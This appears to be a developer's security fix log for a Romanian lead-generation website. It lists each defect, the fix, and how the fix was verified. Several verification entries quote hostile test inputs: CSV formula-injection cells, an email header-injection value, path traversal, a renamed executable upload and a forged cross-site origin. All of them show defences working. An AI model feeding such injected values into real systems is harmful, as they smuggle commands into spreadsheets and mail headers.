- [x] 20 parallel lead submissions: 20 stored, no duplicate IDs. An unreachable `DATABASE_URL` gives 500 (no silent loss).
- [x] JSON-LD parses on every page.
- [x] Titles under 60 chars, canonicals point to www, hreflang ro/en/it/x-default on `/`, `/en/`, `/it/`.
- [x] noindex on the landings, `/multumim/`, `/trimite-documente/`, the newsletter pages, unreviewed articles, `/oferta/`, `/admin/`; the sitemap excludes them.
- [x] Lighthouse mobile: Accessibility, Best Practices and SEO 100 on `/` and `/contact/`.
- [x] axe-core: 0 violations on all 14 public pages at 1440 and 390, including with the consent banner open.
- [x] `npx tsc --noEmit` clean; `npx eslint src scripts` clean.
- [x] Middleware is 105 KB (edge).

---

## Fix log 06.11

Tested on a production build (`NEXT_PUBLIC_GTM_ID=GTM-TEST123 NEXT_DIST_DIR=.next-fix next build`, `next start -p 3130`) with the JSON fallback. Two extra instances of the same build were used: one with a fake `BLOB_READ_WRITE_TOKEN` (port 3132, token route) and one with an unreachable `DATABASE_URL` (port 3131). Tools: Playwright (chromium), Python/urllib, a Node unit script (mocked Neon fetch), poppler.
Final gate: `rm -rf .next && npx tsc --noEmit && npx eslint src scripts && npx next build` all clean. `npm audit --omit=dev`: **0 vulnerabilities** (full `npm audit`: 6 moderate, dev-only, `minimatch` via eslint).
Cleanup: `.data/db.json` restored from the backup (byte-identical), `.data/uploads/` (created by the tests) deleted, test servers stopped, `.next` and `.next-fix` removed, `tsconfig.json` and `next-env.d.ts` restored (`next-env.d.ts` points to `.next-preview`). Port 3200 was not touched; its dev server restarted its worker by itself after the `next` upgrade and is still listening.

| Id | Status | What changed | Verified |
|---|---|---|---|
| C1 | fixed | `next` and `eslint-config-next` 15.5.4 → **15.5.29** (pinned). `overrides`: `postcss` 8.5.32, `sharp` 0.35.5, `@vercel/cli-config` 0.3.7, `zod` 4.6.7. `@vercel/blob` 2.8.2 is the latest stable (its zod chain is fixed by the overrides); `@react-pdf/renderer` 4.9.0 has no advisory. | `npm audit --omit=dev` → 0. Build and PDF route OK. |
| H1 | fixed | `src/lib/csv.ts` (`csvCell`, `csvResponse`) used by both exports: cells starting with `= + - @ \t \r` get a leading `'`. | `=HYPERLINK(…)` → `"'=HYPERLINK(…)"`, `+SUM…` → `'+SUM…`, `-x@ex.ro` → `'-x@ex.ro`, `@SUM(A1)` → `'@SUM(A1)` in the Excel export; unit check of all six prefixes. |
| H2 | fixed | `mergeLeads` moves files and offers (`moveFiles`, `moveOffers` in both backends) before deleting the newer lead. Confirm text updated. | Upload lead #9283 (file + an offer attached) merged into #9273 in the UI: file and offer now on #9273, #9283 gone. |
| H3 | fixed | Blob configured: the browser uploads each file to the private store with `@vercel/blob/client` `upload()`; `/api/documente/upload/` (`handleUpload`) only signs keys `documente/<64 hex>.<pdf|jpg|png|heic>`, needs a valid form token, max 5 per form token, rate limit 15/10 min/IP, types PDF/JPEG/PNG/HEIC, 10 MB, no overwrite, valid 15 min. A JSON POST to `/api/documente/` registers the keys: every blob is read (first 16 bytes + size) and checked by magic bytes; one bad file → all keys deleted, 400. No Blob token: multipart to `/api/documente/` as before, `.data/uploads/`. | Token route on the fake-token instance: valid → client token (decoded constraints: 4 types, 10 485 760 B, no overwrite, no suffix); traversal / `.exe` / missing / forged / expired form token / bad JSON → 400; 6th token for one form → refused; `upload-completed` events → 400. Unit: `readFileHead` on a 3 MB PDF → `application/pdf`, renamed EXE → rejected, missing → null. Local fallback end to end: PDF stored on disk and in admin; renamed EXE and 6 files → 400. A real Blob PUT was not possible without a store. |
| H4 | fixed | Login moved from a server action to `POST /api/login/`: 5 wrong passwords per IP in 15 min → 429 (HTML page, `Retry-After: 900`), counter in memory per instance; every attempt waits 400 ms; comparison stays HMAC + constant-time; cross-site POST → 403. | 5 × 303, then 429, 429; the right password from the locked IP → 429; from another IP → 303 + session. All attempts ~0,40 s. |
| H5 | fixed | `insertActivity` no longer touches `first_contact_at`. `logActivity()` sets it only for apel/email/whatsapp/ofertă written by the team (quick buttons, activity form, offer sent); `changeStatus` sets it when the team moves a lead to contactat/ofertă/client (not for an online acceptance). Uploads, notes, status by the client, offer views: never. Seed and `wasContacted` follow the same rule. | Upload lead: `firstContactAt` null and listed in Azi; note via UI → still null; status → contactat → set; quick "Sună" → set. Seed: 60 demo leads, 0 mismatches with the rule. |
| M1 | fixed | `noOrphan(title, 16)` in `CtaBand` (long last pair not glued), `overflow-wrap: break-word` on the heading, tighter padding/font under 380 px. | `scrollWidth` = viewport on 21 public pages at 360 and 390; screenshot of `/servicii/` CTA at 360. |
| M2 | fixed | Signed form token (`/api/form-token/`, HMAC with `FORM_SECRET` or `ADMIN_SECRET`), fetched on first focus. Faster than 3 s (2 s newsletter), missing or forged token → stored with `suspect = true`, answer `{inline: true}`: the form shows the success inline, no `/multumim/`, no conversion. Honeypot: silent drop, also inline, nothing stored. Admin: "suspectă" chip, filter "Trimiteri suspecte" (also in the export), excluded from Panou, Buget/ROI, Linkuri and the weekly email; still in Azi/pipeline so a fast human gets called. Newsletter: suspect signups get no confirmation email. | No token / immediate token / forged token + `elapsed: 99999` → suspect; after 3,2 s → normal. Browser: callback form filled instantly → inline "Am primit numărul…", URL stays `/contact/`, 0 `generate_lead`, lead suspect. `?s=da` shows only chips, `?s=nu` none. |
| M3 | fixed | Neon `init` resets on failure (and `updateLead`/`updateOffer` now call it). Public routes catch DB errors → JSON 503 "Nu am putut salva mesajul acum. Sunați-ne la 0741 021 805 sau 0799 988 955." Forms show every error with `TrackedLink` phones. Migrations run only when `schema_version` differs (L23). | Unreachable host: 3 × 503 JSON, each ~80 ms (network tried every time, was 3 ms). Unit with mocked fetch: fail, fail (new network call), then recovers and answers once the host responds. |
| M4 | fixed | `requireSession()` in the panel layout and every panel page (soft navigation skips layouts), `requireApiSession()` in all `/api/admin/*` handlers. | Unauthenticated: search, files, abonati, export, activity, offer PDF → 401. |
| M5 | fixed | Uploads never attach to an existing lead: always a new "Documente" lead; the duplicate check flags it for a manual merge. Timeline author "Formular public", text names the sender. `matchLead` (all-leads scan) removed. | Upload with the phone of #9273: new lead #9283, nothing added to #9273, "Posibil duplicat" shown, author "Formular public". |
| M6 | fixed | GTM is injected only after statistics consent (Consent Mode v2 defaults still set). Attribution kept in a module-level store (survives client navigation, sent with forms); `dm_ft`/`dm_lt` written only with the functional category ("Accept", or "Funcționale" in Setări); "Refuz" or switching it off deletes them. Visits: anonymous count without cookie (one row, channel + landing; a full reload may count again; bot UAs not counted). Banner, `/cookies/`, `/confidentialitate/`, README cookie table updated. `ads` choice removed: ad storage is never granted. | Fresh browser on `/?utm_source=fixtest…`: no GTM request, no `dm_` cookie; client-side to `/contact/`, form sent → lead has ft/lt `utm_source=fixtest`, still no GTM/cookies. Accept → `gtm.js?id=GTM-TEST123` requested, `dm_consent=all`, `dm_ft` (with the UTM), `dm_lt`. Setări with both off → only `dm_consent=none`. Refuz → no GTM, only `dm_consent=none`. |
| M7 | fixed | Confirm/unsubscribe GET pages show a button; a server action does the change. Confirmation email carries `List-Unsubscribe` + `List-Unsubscribe-Post` (RFC 8058 POST at `/api/newsletter/dezabonare/`). | GET confirm → still pending; button → confirmed. GET unsubscribe → still confirmed; button → unsubscribed. Bad one-click token → 404. |
| M8 | fixed | `deleteLeadWithFiles` removes stored files before the lead; "Șterge datele demo" removes demo leads' files. | Upload lead deleted in the UI: file gone from `.data/uploads/`, lead gone. |
| M9 | fixed | Forms store a one-time id in `sessionStorage`; `ThanksTracker` consumes it and pushes `generate_lead` with `conversion_id`. DEPLOY.md now recommends the Custom Event trigger. | With consent: after submit 1 event, reload 0, Back/Forward 0, direct `/multumim/?tip=cerere` 0. |
| L1 | fixed | Attribution fields parsed with try/catch → null. | `ft={notjson` → lead saved, `ft` null. |
| L2 | fixed | Phone: only digits, spaces, `+ - . ( )`, 9–15 digits. | `abc123456789xyz` → 400; 16 digits → 400; `+40 (741) 021-805` → 200. |
| L3 | fixed | `line()` collapses whitespace in name, company, phone, email, placement, page. | `FIX newline\r\nBcc: …` stored as one line. |
| L4 | fixed | `overflow-wrap: anywhere` on admin text elements. | 118 × "A" name: Azi, Cereri, lead page, pipeline = 1440 / 390 wide. |
| L5 | partly fixed | Words over 24 characters are split into 16-character pieces in the PDF. The table header is still not repeated on later pages (would need a custom paged table); skipped. | 80-character word wraps inside the service column (pdftotext). |
| L6 | fixed | Apex redirect keeps the trailing slash (files without it); DEPLOY.md now states the hop counts. | `Host: daiamar.ro` `/servicii/` → `https://www.daiamar.ro/servicii/`; `/` → `/`; `/robots.txt` → no slash. |
| L7 | skipped | The OG image URLs are generated by Next's metadata routes; avoiding the 308 means replacing them with explicit routes. Crawlers follow the single 308. | Still 308 to the slash form. |
| L8 | skipped | Needs separate root layouts for `/en/` and `/it/` (route-group restructure of the whole app). | — |
| L9 | fixed | Banner is first in the DOM (fixed position, no layout change) and takes focus when reopened; Esc returns focus to the menu toggle; LeadForm focuses the first invalid field after render; newsletter errors have `aria-describedby`. | Reopened banner focused; empty submit focuses `name`. |
| L10 | partly fixed | Touch screens: invisible 44 px hit areas on breadcrumbs, map/Waze links and the EN/IT switch; inline form phone links are 44 px. Footer links and "Setări cookie-uri" left as they are to keep the new footer design; FAQ "Vezi și" links not changed. | No layout shift (360/390 overflow check). |
| L11 | fixed | `--warn` → `#a24a25`: 5,26:1 on `#fbefe9` (was 4,42:1). | — |
| L12 | fixed | `frame-src 'self'`, `report-uri` + `report-to` → `/api/csp-report/` (logs to the server log, rate-limited), `Reporting-Endpoints` header. | Headers present; endpoint 204. |
| L13 | partly fixed | Unknown service/article pages get title "Pagina nu există" and `noindex`. `/admin/leads/999999/` still answers 200 (admin only, streamed by `loading.tsx`); skipped. | `/servicii/nu-exista/` → 404, noindex. |
| L14 | fixed | IP from `x-real-ip` first; visit beacons from bot user agents are not stored; events need same-origin. | HeadlessChrome visit not stored, normal one stored, cross-site → 403. |
| L15 | fixed | `crossSite()` (Origin / Sec-Fetch-Site) on leads, documente, upload token, newsletter, events, login. | `Origin: https://evil.example` → 403, nothing stored. |
| L16 | skipped | Needs a session version stored in the DB and checked in the edge middleware. DEPLOY.md now says: rotate `ADMIN_SECRET` to log everyone out. | — |
| L17 | fixed | Admin sums reject decimals ("2500,6" → error); offer builder: dots are thousands separators only when the whole integer part is grouped. | `0.125` → 0,125; `1.250` → 1250; `12.345.678` → 12345678; `2500,6` → rejected. |
| L18 | fixed | `dm_author` httpOnly, Secure in production, path `/` (with path `/admin` it never reached `/api/admin/…`, so quick actions were logged as "Echipa"). | — |
| L19 | fixed | Pending re-signup keeps token and filled fields; `emailed` is the real value. | Second signup: same token, name kept, `emailed: false` without Resend. |
| L20 | fixed | No GTM and no attribution capture on `/newsletter/*`. | — |
| L21 | fixed | Atomic write (temp + rename); a file that does not parse throws instead of being treated as empty. | All tests ran against it; db restored byte-identical. |
| L22 | fixed | `storeFile` throws a clear "Connect Vercel Blob" error on Vercel without the token; the route answers JSON 503 with the phones. | — |
| L23 | partly fixed | Migrations skipped when `settings.schema_version` matches (`SCHEMA_VERSION` = 2). Lost updates on concurrent edits and the `nextOfferNumber` race: skipped (rare with this team size). | Unit test path with mocked Neon. |
| L24 | partly fixed | `register="tu"` now also changes the service label; weekly email pluralises; `/confidentialitate/` and `/termeni/` descriptions ≤ 160; offer page phones/email are `TrackedLink`; project `.gitignore` ignores `.env*`. Lighthouse LCP not addressed (depends on the final hero photo). | Descriptions 154 / 160 / 159 (cookies). |

**Also fixed while testing:** `scripts/seed.mts` import hook resolved relative requires inside `node_modules/*/src/` as app files (broke once `lib/leads.ts` imported storage); Neon `updateLead`/`updateOffer` ran before `init()`.

**Client / Roland questions (not code):**
- `/firme-noi/` (ONRC flyer landing) uses "tu" only in the form; the rest of the form text (consent, button) is neutral or first person. Should the whole landing be "tu"?
- LCP on `/` waits for the final hero photo from the Daiamar shoot.

**For deploy:**
- New optional env `FORM_SECRET` (falls back to `ADMIN_SECRET`). `NEXT_PUBLIC_SITE_URL` only on demo/preview.
- The Blob store must be created **Private**. Files uploaded by a visitor who then closes the page stay in Blob without a lead; check Storage → Blob now and then.
- GTM: use the Custom Event trigger `generate_lead` (with `conversion_id`), not Page View on `/multumim/`.
- Login lockout and form rate limits are in memory per Vercel instance.
